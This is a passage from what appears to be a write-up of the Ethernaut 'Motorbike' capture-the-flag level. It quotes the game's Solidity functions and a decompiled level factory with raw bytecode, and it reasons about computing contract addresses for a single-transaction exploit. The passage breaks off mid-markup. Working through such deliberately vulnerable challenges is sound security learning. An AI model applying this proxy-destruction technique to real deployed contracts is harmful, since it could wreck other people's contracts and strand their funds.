class=\"language-plaintext highlighter-rouge\">signAndAttachDelegation()</code> function utilizes EIP-7702 features to sign an authorization, allowing the contract to be delegated to a wallet address.</p><p>I used this function specifically to address the requirements of <code class=\"language-plaintext highlighter-rouge\">submitLevelInstance()</code>.</p><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>    <span class=\"k\">function</span> <span class=\"n\">submitLevelInstance</span><span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"k\">payable</span> <span class=\"n\">_instance</span><span class=\"p\">)</span> <span class=\"k\">public</span> <span class=\"p\">{</span>        <span class=\"c1\">// Get player and level.</span>        <span class=\"n\">EmittedInstanceData</span> <span class=\"k\">storage</span> <span class=\"n\">data</span> <span class=\"o\">=</span> <span class=\"n\">emittedInstances</span><span class=\"p\">[</span><span class=\"n\">_instance</span><span class=\"p\">];</span>        <span class=\"nb\">require</span><span class=\"p\">(</span>            <span class=\"n\">data</span><span class=\"p\">.</span><span class=\"n\">player</span> <span class=\"o\">==</span> <span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">,</span>            <span class=\"s\">\"This instance doesn't belong to the current user\"</span>        <span class=\"p\">);</span> <span class=\"c1\">// instance was emitted for this player</span>        <span class=\"nb\">require</span><span class=\"p\">(</span><span class=\"n\">data</span><span class=\"p\">.</span><span class=\"n\">completed</span> <span class=\"o\">==</span> <span class=\"nb\">false</span><span class=\"p\">,</span> <span class=\"s\">\"Level has been completed already\"</span><span class=\"p\">);</span> <span class=\"c1\">// not already submitted</span>        <span class=\"c1\">// Have the level check the instance.</span>        <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">data</span><span class=\"p\">.</span><span class=\"n\">level</span><span class=\"p\">.</span><span class=\"n\">validateInstance</span><span class=\"p\">(</span><span class=\"n\">_instance</span><span class=\"p\">,</span> <span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">))</span> <span class=\"p\">{</span>            <span class=\"c1\">// Register instance as completed.</span>            <span class=\"n\">data</span><span class=\"p\">.</span><span class=\"n\">completed</span> <span class=\"o\">=</span> <span class=\"nb\">true</span><span class=\"p\">;</span>            <span class=\"n\">statistics</span><span class=\"p\">.</span><span class=\"n\">submitSuccess</span><span class=\"p\">(</span>                <span class=\"n\">_instance</span><span class=\"p\">,</span>                <span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"n\">data</span><span class=\"p\">.</span><span class=\"n\">level</span><span class=\"p\">),</span>                <span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span>            <span class=\"p\">);</span>            <span class=\"c1\">// Notify success via logs.</span>            <span class=\"k\">emit</span> <span class=\"n\">LevelCompletedLog</span><span class=\"p\">(</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">,</span> <span class=\"n\">_instance</span><span class=\"p\">,</span> <span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"n\">data</span><span class=\"p\">.</span><span class=\"n\">level</span><span class=\"p\">));</span>        <span class=\"p\">}</span> <span class=\"k\">else</span> <span class=\"p\">{</span>            <span class=\"n\">statistics</span><span class=\"p\">.</span><span class=\"n\">submitFailure</span><span class=\"p\">(</span>                <span class=\"n\">_instance</span><span class=\"p\">,</span>                <span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"n\">data</span><span class=\"p\">.</span><span class=\"n\">level</span><span class=\"p\">),</span>                <span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span>            <span class=\"p\">);</span>        <span class=\"p\">}</span>    <span class=\"p\">}</span></code></pre></div></div><p>The <code class=\"language-plaintext highlighter-rouge\">submitLevelInstance()</code> function, which is executed when the “Submit instance” button is clicked, retrieves <code class=\"language-plaintext highlighter-rouge\">emittedInstances[_instance]</code> to verify if the instance was registered by <code class=\"language-plaintext highlighter-rouge\">msg.sender</code>.</p><p>This results in a failure when attempting to submit the solution to the Ethernaut site.</p><h2 id=\"obtaining-the-motorbike-and-engine-contract-addresses\">Obtaining the Motorbike and Engine Contract addresses</h2><p>The following outlines the process of determining the Motorbike and Engine Contract addresses.</p><p>Although the goal is to reduce the Engine Contract’s code size to 0, the <code class=\"language-plaintext highlighter-rouge\">createLevelInstance()</code> function:</p><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>    <span class=\"k\">function</span> <span class=\"n\">createLevelInstance</span><span class=\"p\">(</span><span class=\"n\">Level</span> <span class=\"n\">_level</span><span class=\"p\">)</span> <span class=\"k\">public</span> <span class=\"k\">payable</span> <span class=\"p\">{</span>        <span class=\"c1\">// Ensure level is registered.</span>        <span class=\"nb\">require</span><span class=\"p\">(</span><span class=\"n\">registeredLevels</span><span class=\"p\">[</span><span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"n\">_level</span><span class=\"p\">)],</span> <span class=\"s\">\"This level doesn't exists\"</span><span class=\"p\">);</span>        <span class=\"c1\">// Get level factory to create an instance.</span>        <span class=\"kt\">address</span> <span class=\"n\">instance</span> <span class=\"o\">=</span> <span class=\"n\">_level</span><span class=\"p\">.</span><span class=\"n\">createInstance</span><span class=\"p\">{</span><span class=\"n\">value</span><span class=\"o\">:</span> <span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">value</span><span class=\"p\">}(</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">);</span>        <span class=\"c1\">// Store emitted instance relationship with player and level.</span>        <span class=\"n\">emittedInstances</span><span class=\"p\">[</span><span class=\"n\">instance</span><span class=\"p\">]</span> <span class=\"o\">=</span> <span class=\"n\">EmittedInstanceData</span><span class=\"p\">(</span>            <span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">,</span>            <span class=\"n\">_level</span><span class=\"p\">,</span>            <span class=\"nb\">false</span>        <span class=\"p\">);</span>        <span class=\"n\">statistics</span><span class=\"p\">.</span><span class=\"n\">createNewInstance</span><span class=\"p\">(</span><span class=\"n\">instance</span><span class=\"p\">,</span> <span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"n\">_level</span><span class=\"p\">),</span> <span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">);</span>        <span class=\"c1\">// Retrieve created instance via logs.</span>        <span class=\"k\">emit</span> <span class=\"n\">LevelInstanceCreatedLog</span><span class=\"p\">(</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">,</span> <span class=\"n\">instance</span><span class=\"p\">,</span> <span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"n\">_level</span><span class=\"p\">));</span>    <span class=\"p\">}</span></code></pre></div></div><p>does not return any values. Furthermore, since the exploit must occur within a single transaction, event logs are inaccessible, making it necessary to manually calculate the contract addresses.</p><p>As observed in the challenge and Level instance code:</p><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// Decompiled by library.dedaub.com// 2026.01.17 06:27 UTC// Compiled using the solidity compiler version 0.6.12</span><span class=\"c1\">// Data structures and variables inferred from the use of storage instructions</span><span class=\"k\">mapping</span> <span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"o\">=&gt;</span> <span class=\"kt\">address</span><span class=\"p\">)</span> <span class=\"n\">_createInstance</span><span class=\"p\">;</span> <span class=\"c1\">// STORAGE[0x1]</span><span class=\"kt\">address</span> <span class=\"n\">_owner</span><span class=\"p\">;</span> <span class=\"c1\">// STORAGE[0x0] bytes 0 to 19</span><span class=\"c1\">// Events</span><span class=\"n\">OwnershipTransferred</span><span class=\"p\">(</span><span class=\"kt\">address</span><span class=\"p\">,</span> <span class=\"kt\">address</span><span class=\"p\">);</span><span class=\"k\">function</span> <span class=\"n\">transferOwnership</span><span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"n\">newOwner</span><span class=\"p\">)</span> <span class=\"k\">public</span> <span class=\"n\">nonPayable</span> <span class=\"p\">{</span>     <span class=\"nb\">require</span><span class=\"p\">(</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">data</span><span class=\"p\">.</span><span class=\"n\">length</span> <span class=\"o\">-</span> <span class=\"mi\">4</span> <span class=\"o\">&gt;=</span> <span class=\"mi\">32</span><span class=\"p\">);</span>    <span class=\"nb\">require</span><span class=\"p\">(</span><span class=\"n\">_owner</span> <span class=\"o\">==</span> <span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">,</span> <span class=\"n\">Error</span><span class=\"p\">(</span><span class=\"s\">'Ownable: caller is not the owner'</span><span class=\"p\">));</span>    <span class=\"nb\">require</span><span class=\"p\">(</span><span class=\"n\">newOwner</span><span class=\"p\">,</span> <span class=\"n\">Error</span><span class=\"p\">(</span><span class=\"s\">'Ownable: new owner is the zero address'</span><span class=\"p\">));</span>    <span class=\"k\">emit</span> <span class=\"n\">OwnershipTransferred</span><span class=\"p\">(</span><span class=\"n\">_owner</span><span class=\"p\">,</span> <span class=\"n\">newOwner</span><span class=\"p\">);</span>    <span class=\"n\">_owner</span> <span class=\"o\">=</span> <span class=\"n\">newOwner</span><span class=\"p\">;</span><span class=\"p\">}</span><span class=\"k\">function</span> <span class=\"k\">fallback</span><span class=\"p\">()</span> <span class=\"k\">public</span> <span class=\"k\">payable</span> <span class=\"p\">{</span>     <span class=\"nb\">revert</span><span class=\"p\">();</span><span class=\"p\">}</span><span class=\"k\">function</span> <span class=\"n\">renounceOwnership</span><span class=\"p\">()</span> <span class=\"k\">public</span> <span class=\"n\">nonPayable</span> <span class=\"p\">{</span>     <span class=\"nb\">require</span><span class=\"p\">(</span><span class=\"n\">_owner</span> <span class=\"o\">==</span> <span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">,</span> <span class=\"n\">Error</span><span class=\"p\">(</span><span class=\"s\">'Ownable: caller is not the owner'</span><span class=\"p\">));</span>    <span class=\"k\">emit</span> <span class=\"n\">OwnershipTransferred</span><span class=\"p\">(</span><span class=\"n\">_owner</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">);</span>    <span class=\"n\">_owner</span> <span class=\"o\">=</span> <span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"p\">}</span><span class=\"k\">function</span> <span class=\"n\">createInstance</span><span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"n\">_hub</span><span class=\"p\">)</span> <span class=\"k\">public</span> <span class=\"k\">payable</span> <span class=\"p\">{</span>     <span class=\"nb\">require</span><span class=\"p\">(</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">data</span><span class=\"p\">.</span><span class=\"n\">length</span> <span class=\"o\">-</span> <span class=\"mi\">4</span> <span class=\"o\">&gt;=</span> <span class=\"mi\">32</span><span class=\"p\">);</span>    <span class=\"n\">MEM</span><span class=\"p\">[</span><span class=\"n\">v220V0x8c</span><span class=\"p\">.</span><span class=\"n\">data</span><span class=\"o\">:</span><span class=\"n\">v220V0x8c</span><span class=\"p\">.</span><span class=\"n\">data</span> <span class=\"o\">+</span> <span class=\"mi\">1353</span><span class=\"p\">]</span> <span class=\"o\">=</span> <span class=\"mh\">0x608060405234801561001057600080fd5b50610529806100206000396000f3fe60806040526004361061003f5760003560e01c80634f1ef28614610044578063564f6d71146100fc5780638129fc1c14610123578063af26974514610138575b600080fd5b6100fa6004803603604081101561005a57600080fd5b6001600160a01b03823516919081019060408101602082013564010000000081111561008557600080fd5b82018360208201111561009757600080fd5b803590602001918460018302840111640100000000831117156100b957600080fd5b91908080601f016020809104026020016040519081016040528093929190818152602001838380828437600092019190915250929550610169945050505050565b005b34801561010857600080fd5b5061011161017f565b60408051918252519081900360200190f35b34801561012f57600080fd5b506100fa610185565b34801561014457600080fd5b5061014d61025c565b604080516001600160a01b039092168252519081900360200190f35b610171610271565b61017b82826102d8565b5050565b60015481565b600054610100900460ff168061019e575061019e6103e4565b806101ac575060005460ff16155b6101e75760405162461bcd60e51b815260040180806020018281038252602e815260200180610499602e913960400191505060405180910390fd5b600054610100900460ff16158015610212576000805460ff1961ff0019909116610100171660011790555b6103e8600155600080547fffffffffffffffffffff0000000000000000000000000000000000000000ffff163362010000021790558015610259576000805461ff00191690555b50565b6000546201000090046001600160a01b031681565b6000546201000090046001600160a01b031633146102d6576040805162461bcd60e51b815260206004820152600d60248201527f43616e2774207570677261646500000000000000000000000000000000000000604482015290519081900360640190fd5b565b6102e1826103f5565b80511561017b576000826001600160a01b0316826040518082805190602001908083835b602083106103245780518252601f199092019160209182019101610305565b6001836020036101000a038019825116818451168082178552505050505050905001915050600060405180830381855af49150503d8060008114610384576040519150601f19603f3d011682016040523d82523d6000602084013e610389565b606091505b50509050806103df576040805162461bcd60e51b815260206004820152600b60248201527f43616c6c206661696c6564000000000000000000000000000000000000000000604482015290519081900360640190fd5b505050565b60006103ef30610492565b15905090565b6103fe81610492565b6104395760405162461bcd60e51b815260040180806020018281038252602d8152602001806104c7602d913960400191505060405180910390fd5b7f360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc80547fffffffffffffffffffffffff0000000000000000000000000000000000000000166001600160a01b0392909216919091179055565b3b15159056fe496e697469616c697a61626c653a20636f6e747261637420697320616c726561647920696e697469616c697a6564455243313936373a206e657720696d706c656d656e746174696f6e206973206e6f74206120636f6e7472616374a264697066735822122007424dee2c3970da4b44a842c5d8a06a97751da3c8c268eeecaa2569e32a9f3964736f6c634300060c0033</span><span class=\"p\">;</span>    <span class=\"n\">v0</span> <span class=\"o\">=</span> <span class=\"n\">create</span><span class=\"p\">.</span><span class=\"n\">code</span><span class=\"p\">(</span><span class=\"n\">v1</span><span class=\"p\">.</span><span class=\"n\">data</span><span class=\"p\">,</span> <span class=\"mi\">1353</span><span class=\"p\">).</span><span class=\"n\">value</span><span class=\"p\">(</span><span class=\"mi\">0</span><span class=\"p\">);</span>    <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"kt\">bool</span><span class=\"p\">(</span><span class=\"n\">v0</span><span class=\"p\">))</span> <span class=\"p\">{</span>        <span class=\"n\">MEM</span><span class=\"p\">[</span><span class=\"n\">v24eV0x8c</span><span class=\"p\">.</span><span class=\"n\">data</span><span class=\"o\">:</span><span class=\"n\">v24eV0x8c</span><span class=\"p\">.</span><span class=\"n\">data</span> <span class=\"o\">+</span> <span class=\"mi\">705</span><span class=\"p\">]</span> <span class=\"o\">=</span> <span class=\"mh\">0x608060405234801561001057600080fd5b506040516102c13803806102c18339818101604052602081101561003357600080fd5b5051610049816101d1602090811b61007017901c565b6100845760405162461bcd60e51b815260040180806020018281038252602d815260200180610294602d913960400191505060405180910390fd5b806100ae7f360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc6101d7565b80546001600160a01b039283166001600160a01b031990911617905560408051600481526024810182526020810180516001600160e01b031663204a7f0760e21b1781529151815160009486169382918083835b602083106101215780518252601f199092019160209182019101610102565b6001836020036101000a038019825116818451168082178552505050505050905001915050600060405180830381855af49150503d8060008114610181576040519150601f19603f3d011682016040523d82523d6000602084013e610186565b606091505b50509050806101ca576040805162461bcd60e51b815260206004820152600b60248201526a10d85b1b0819985a5b195960aa1b604482015290519081900360640190fd5b50506101da565b3b151590565b90565b60ac806101e86000396000f3fe60806040526048602d7f360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc604a565b5473ffffffffffffffffffffffffffffffffffffffff16604d565b005b90565b3660008037600080366000845af43d6000803e808015606b573d6000f35b3d6000fd5b3b15159056fea2646970667358221220ca7b336654cd29640f3df95da5dc17f0facf369b8d4692675b71665674d682be64736f6c634300060c0033455243313936373a206e657720696d706c656d656e746174696f6e206973206e6f74206120636f6e7472616374</span><span class=\"p\">;</span>        <span class=\"n\">v2</span> <span class=\"o\">=</span> <span class=\"n\">create</span><span class=\"p\">.</span><span class=\"n\">code</span><span class=\"p\">(</span><span class=\"n\">v3</span><span class=\"p\">.</span><span class=\"n\">data</span><span class=\"p\">,</span> <span class=\"mi\">737</span><span class=\"p\">).</span><span class=\"n\">value</span><span class=\"p\">(</span><span class=\"mi\">0</span><span class=\"p\">);</span>        <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"kt\">bool</span><span class=\"p\">(</span><span class=\"n\">v2</span><span class=\"p\">))</span> <span class=\"p\">{</span>            <span class=\"n\">_createInstance</span><span class=\"p\">[</span><span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"n\">v2</span><span class=\"p\">)]</span> <span class=\"o\">=</span> <span class=\"n\">v0</span><span class=\"p\">;</span>            <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"nb\">this</span><span class=\"p\">.</span><span class=\"nb\">balance</span> <span class=\"o\">&gt;=</span> <span class=\"mi\">0</span><span class=\"p\">)</span> <span class=\"p\">{</span>                <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"kt\">bool</span><span class=\"p\">(</span><span class=\"n\">v2</span><span class=\"p\">.</span><span class=\"n\">code</span><span class=\"p\">.</span><span class=\"n\">size</span><span class=\"p\">))</span> <span class=\"p\">{</span>                    <span class=\"n\">v4</span> <span class=\"o\">=</span> <span class=\"n\">v5</span> <span class=\"o\">=</span> <span class=\"n\">MEM</span><span class=\"p\">[</span><span class=\"mi\">64</span><span class=\"p\">];</span>                    <span class=\"n\">v6</span> <span class=\"o\">=</span> <span class=\"n\">v7</span> <span class=\"o\">=</span> <span class=\"mi\">96</span> <span class=\"o\">+</span> <span class=\"n\">MEM</span><span class=\"p\">[</span><span class=\"mi\">64</span><span class=\"p\">];</span>                    <span class=\"k\">while</span> <span class=\"p\">(</span><span class=\"n\">v8</span> <span class=\"o\">&gt;=</span> <span class=\"mi\">32</span><span class=\"p\">)</span> <span class=\"p\">{</span>                        <span class=\"n\">MEM</span><span class=\"p\">[</span><span class=\"n\">v4</span><span class=\"p\">]</span> <span class=\"o\">=</span> <span class=\"n\">MEM</span><span class=\"p\">[</span><span class=\"n\">v6</span><span class=\"p\">];</span>                        <span class=\"n\">v8</span> <span class=\"o\">=</span> <span class=\"n\">v8</span> <span class=\"o\">-</span> <span class=\"mi\">32</span><span class=\"p\">;</span>                        <span class=\"n\">v4</span> <span class=\"o\">+=</span> <span class=\"mi\">32</span><span class=\"p\">;</span>                        <span class=\"n\">v6</span> <span class=\"o\">+=</span> <span class=\"mi\">32</span><span class=\"p\">;</span>                    <span class=\"p\">}</span>                    <span class=\"n\">MEM</span><span class=\"p\">[</span><span class=\"n\">v4</span><span class=\"p\">]</span> <span class=\"o\">=</span> <span class=\"n\">MEM</span><span class=\"p\">[</span><span class=\"n\">v6</span><span class=\"p\">]</span> <span class=\"o\">&amp;</span> <span class=\"o\">~</span><span class=\"p\">((</span><span class=\"kt\">uint8</span><span class=\"p\">.</span><span class=\"n\">max</span> <span class=\"o\">+</span> <span class=\"mi\">1</span><span class=\"p\">)</span> <span class=\"o\">**</span> <span class=\"p\">(</span><span class=\"mi\">32</span> <span class=\"o\">-</span> <span class=\"n\">v8</span><span class=\"p\">)</span> <span class=\"o\">-</span> <span class=\"mi\">1</span><span class=\"p\">)</span> <span class=\"o\">|</span> <span class=\"n\">MEM</span><span class=\"p\">[</span><span class=\"n\">v4</span><span class=\"p\">]</span> <span class=\"o\">&amp;</span> <span class=\"p\">(</span><span class=\"kt\">uint8</span><span class=\"p\">.</span><span class=\"n\">max</span> <span class=\"o\">+</span> <span class=\"mi\">1</span><span class=\"p\">)</span> <span class=\"o\">**</span> <span class=\"p\">(</span><span class=\"mi\">32</span> <span class=\"o\">-</span> <span class=\"n\">v8</span><span class=\"p\">)</span> <span class=\"o\">-</span> <span class=\"mi\">1</span><span class=\"p\">;</span>                    <span class=\"n\">v9</span><span class=\"p\">,</span> <span class=\"cm\">/* uint256 */</span> <span class=\"n\">v10</span><span class=\"p\">,</span> <span class=\"cm\">/* uint256 */</span> <span class=\"n\">v11</span><span class=\"p\">,</span> <span class=\"cm\">/* uint256 */</span> <span class=\"n\">v12</span> <span class=\"o\">=</span> <span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"n\">v2</span><span class=\"p\">).</span><span class=\"n\">upgrader</span><span class=\"p\">().</span><span class=\"n\">gas</span><span class=\"p\">(</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">gas</span><span class=\"p\">);</span>                    <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">RETURNDATASIZE</span><span class=\"p\">()</span> <span class=\"o\">==</span> <span class=\"mi\">0</span><span class=\"p\">)</span> <span class=\"p\">{</span>                        <span class=\"n\">v13</span> <span class=\"o\">=</span> <span class=\"n\">v14</span> <span class=\"o\">=</span> <span class=\"mi\">96</span><span class=\"p\">;</span>                    <span class=\"p\">}</span> <span class=\"k\">else</span> <span class=\"p\">{</span>                        <span class=\"n\">v13</span> <span class=\"o\">=</span> <span class=\"n\">v15</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"kt\">bytes</span><span class=\"p\">[](</span><span class=\"n\">RETURNDATASIZE</span><span class=\"p\">());</span>                        <span class=\"n\">RETURNDATACOPY</span><span class=\"p\">(</span><span class=\"n\">v15</span><span class=\"p\">.</span><span class=\"n\">data</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"n\">RETURNDATASIZE</span><span class=\"p\">());</span>                    <span class=\"p\">}</span>                    <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"o\">!</span><span class=\"n\">v9</span><span class=\"p\">)</span> <span class=\"p\">{</span>                        <span class=\"nb\">require</span><span class=\"p\">(</span><span class=\"o\">!</span><span class=\"n\">MEM</span><span class=\"p\">[</span><span class=\"n\">v13</span><span class=\"p\">],</span> <span class=\"n\">v12</span><span class=\"p\">,</span> <span class=\"n\">MEM</span><span class=\"p\">[</span><span class=\"n\">v13</span><span class=\"p\">]);</span>                        <span class=\"n\">v16</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"kt\">bytes</span><span class=\"p\">[](</span><span class=\"n\">v17</span><span class=\"p\">.</span><span class=\"n\">length</span><span class=\"p\">);</span>                        <span class=\"n\">v18</span> <span class=\"o\">=</span> <span class=\"n\">v19</span> <span class=\"o\">=</span> <span class=\"mi\">0</span><span class=\"p\">;</span>                        <span class=\"k\">while</span> <span class=\"p\">(</span><span class=\"n\">v18</span> <span class=\"o\">&lt;</span> <span class=\"n\">v17</span><span class=\"p\">.</span><span class=\"n\">length</span><span class=\"p\">)</span> <span class=\"p\">{</span>                            <span class=\"n\">v16</span><span class=\"p\">[</span><span class=\"n\">v18</span><span class=\"p\">]</span> <span class=\"o\">=</span> <span class=\"n\">v17</span><span class=\"p\">[</span><span class=\"n\">v18</span><span class=\"p\">];</span>                            <span class=\"n\">v18</span> <span class=\"o\">+=</span> <span class=\"mi\">32</span><span class=\"p\">;</span>                        <span class=\"p\">}</span>                        <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"mi\">30</span><span class=\"p\">)</span> <span class=\"p\">{</span>                            <span class=\"n\">MEM</span><span class=\"p\">[</span><span class=\"n\">v16</span><span class=\"p\">.</span><span class=\"n\">data</span><span class=\"p\">]</span> <span class=\"o\">=</span> <span class=\"kt\">bytes30</span><span class=\"p\">(</span><span class=\"s\">'Address: low-level call failed'</span><span class=\"p\">);</span>                        <span class=\"p\">}</span>                        <span class=\"nb\">revert</span><span class=\"p\">(</span><span class=\"n\">Error</span><span class=\"p\">(</span><span class=\"n\">v16</span><span class=\"p\">));</span>                    <span class=\"p\">}</span> <span class=\"k\">else</span> <span class=\"p\">{</span>                        <span class=\"nb\">require</span><span class=\"p\">(</span><span class=\"nb\">keccak256</span><span class=\"p\">(</span><span class=\"n\">MEM</span><span class=\"p\">[</span><span class=\"mi\">32</span> <span class=\"o\">+</span> <span class=\"n\">v784_0x1V0x62cV0x5e4V0x284V0x8c</span><span class=\"o\">:</span><span class=\"mi\">32</span> <span class=\"o\">+</span> <span class=\"n\">v784_0x1V0x62cV0x5e4V0x284V0x8c</span> <span class=\"o\">+</span> <span class=\"n\">MEM</span><span class=\"p\">[</span><span class=\"n\">v784_0x1V0x62cV0x5e4V0x284V0x8c</span><span class=\"p\">]])</span> <span class=\"o\">==</span> <span class=\"nb\">keccak256</span><span class=\"p\">(</span><span class=\"nb\">this</span><span class=\"p\">),</span> <span class=\"n\">Error</span><span class=\"p\">(</span><span class=\"s\">'Wrong upgrader address'</span><span class=\"p\">));</span>                        <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"nb\">this</span><span class=\"p\">.</span><span class=\"nb\">balance</span> <span class=\"o\">&gt;=</span> <span class=\"mi\">0</span><span class=\"p\">)</span> <span class=\"p\">{</span>                            <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"kt\">bool</span><span class=\"p\">(</span><span class=\"n\">v2</span><span class=\"p\">.</span><span class=\"n\">code</span><span class=\"p\">.</span><span class=\"n\">size</span><span class=\"p\">))</span> <span class=\"p\">{</span>                                <span class=\"n\">v20</span> <span class=\"o\">=</span> <span class=\"n\">v21</span> <span class=\"o\">=</span> <span class=\"n\">MEM</span><span class=\"p\">[</span><span class=\"mi\">64</span><span class=\"p\">];</span>                                <span class=\"n\">v22</span> <span class=\"o\">=</span> <span class=\"n\">v23</span> <span class=\"o\">=</span> <span class=\"mi\">96</span> <span class=\"o\">+</span> <span class=\"n\">MEM</span><span class=\"p\">[</span><span class=\"mi\">64</span><span class=\"p\">];</span>                                <span class=\"k\">while</span> <span class=\"p\">(</span><span class=\"n\">v24</span> <span class=\"o\">&gt;=</span> <span class=\"mi\">32</span><span class=\"p\">)</span> <span class=\"p\">{</span>                                    <span class=\"n\">MEM</span><span class=\"p\">[</span><span class=\"n\">v20</span><span class=\"p\">]</span> <span class=\"o\">=</span> <span class=\"n\">MEM</span><span class=\"p\">[</span><span class=\"n\">v22</span><span class=\"p\">];</span>                                    <span class=\"n\">v24</span> <span class=\"o\">=</span> <span class=\"n\">v24</span> <span class=\"o\">-</span> <span class=\"mi\">32</span><span class=\"p\">;</span>                                    <span class=\"n\">v20</span> <span class=\"o\">+=</span> <span class=\"mi\">32</span><span class=\"p\">;</span>                                    <span class=\"n\">v22</span> <span class=\"o\">+=</span> <span class=\"mi\">32</span><span class=\"p\">;</span>                                <span class=\"p\">}</span>                                <span class=\"n\">MEM</span><span class=\"p\">[</span><span class=\"n\">v20</span><span class=\"p\">]</span> <span class=\"o\">=</span> <span class=\"n\">MEM</span><span class=\"p\">[</span><span class=\"n\">v22</span><span class=\"p\">]</span> <span class=\"o\">&amp;</span> <span class=\"o\">~</span><span class=\"p\">((</span><span class=\"kt\">uint8</span><span class=\"p\">.</span><span class=\"n\">max</span> <span class=\"o\">+</span> <span class=\"mi\">1</span><span class=\"p\">)</span> <span class=\"o\">**</span> <span class=\"p\">(</span><span class=\"mi\">32</span> <span class=\"o\">-</span> <span class=\"n\">v24</span><span class=\"p\">)</span> <span class=\"o\">-</span> <span class=\"mi\">1</span><span class=\"p\">)</span> <span class=\"o\">|</span> <span class=\"n\">MEM</span><span class=\"p\">[</span><span class=\"n\">v20</span><span class=\"p\">]</span> <span class=\"o\">&amp;</span> <span class=\"p\">(</span><span class=\"kt\">uint8</span><span class=\"p\">.</span><span class=\"n\">max</span> <span class=\"o\">+</span> <span class=\"mi\">1</span><span class=\"p\">)</span> <span class=\"o\">**</span> <span class=\"p\">(</span><span class=\"mi\">32</span> <span class=\"o\">-</span> <span class=\"n\">v24</span><span class=\"p\">)</span> <span class=\"o\">-</span> <span class=\"mi\">1</span><span class=\"p\">;</span>                                <span class=\"n\">v25</span><span class=\"p\">,</span> <span class=\"cm\">/* uint256 */</span> <span class=\"n\">v26</span><span class=\"p\">,</span> <span class=\"cm\">/* uint256 */</span> <span class=\"n\">v27</span><span class=\"p\">,</span> <span class=\"cm\">/* uint256 */</span> <span class=\"n\">v28</span> <span class=\"o\">=</span> <span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"n\">v2</span><span class=\"p\">).</span><span class=\"nb\">call</span><span class=\"p\">(</span><span class=\"mh\">0x564f6d7100000000000000000000000000000000000000000000000000000000</span> <span class=\"o\">|</span> <span class=\"kt\">uint224</span><span class=\"p\">(</span><span class=\"n\">MEM</span><span class=\"p\">[</span><span class=\"n\">MEM</span><span class=\"p\">[</span><span class=\"mi\">64</span><span class=\"p\">]</span> <span class=\"o\">+</span> <span class=\"mi\">96</span><span class=\"p\">])).</span><span class=\"n\">gas</span><span class=\"p\">(</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">gas</span><span class=\"p\">);</span>                                <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">RETURNDATASIZE</span><span class=\"p\">()</span> <span class=\"o\">==</span> <span class=\"mi\">0</span><span class=\"p\">)</span> <span class=\"p\">{</span>                                    <span class=\"n\">v29</span> <span class=\"o\">=</span> <span class=\"n\">v30</span> <span class=\"o\">=</span> <span class=\"mi\">96</span><span class=\"p\">;</span>                                <span class=\"p\">}</span> <span class=\"k\">else</span> <span class=\"p\">{</span>                                    <span class=\"n\">v29</span> <span class=\"o\">=</span> <span class=\"n\">v31</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"kt\">bytes</span><span class=\"p\">[](</span><span class=\"n\">RETURNDATASIZE</span><span class=\"p\">());</span>                                    <span class=\"n\">RETURNDATACOPY</span><span class=\"p\">(</span><span class=\"n\">v31</span><span class=\"p\">.</span><span class=\"n\">data</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"n\">RETURNDATASIZE</span><span class=\"p\">());</span>                                <span class=\"p\">}</span>                                <span 